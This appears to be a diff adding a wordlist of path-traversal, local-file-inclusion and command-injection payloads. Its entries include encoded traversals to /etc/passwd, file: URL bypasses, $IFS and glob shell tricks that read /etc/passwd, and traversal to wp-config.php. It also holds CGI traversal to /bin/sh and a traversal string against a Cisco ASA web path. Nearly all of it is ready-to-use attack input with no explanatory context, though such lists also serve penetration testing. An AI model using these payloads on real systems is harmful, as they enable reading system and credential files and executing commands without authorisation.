@@ -1,1 +1,21 @@
-
+payload
+%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd
+../../etc/passwd
+file:///etc/./passwd
+/foo/../etc/bar/../passwd
+file:/etc/passwd?/
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/?/../passwd
+file:///etc/%3F/../passwd
+file:${br}/et${u}c/pas${te}swd?/
+file:$(br)/et$(u)c/pas$(te)swd?/
+../et*/pas**d
+../../../wp-config.php 
+/api/system/debug/support/bundle/download/{filename}
+../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+"""/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd /cgi-bin/.%2%65/.%2%65/.%2%65/.%2%65/etc/passwd /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+/???/???/c?t$IFS/???/p?s?w?
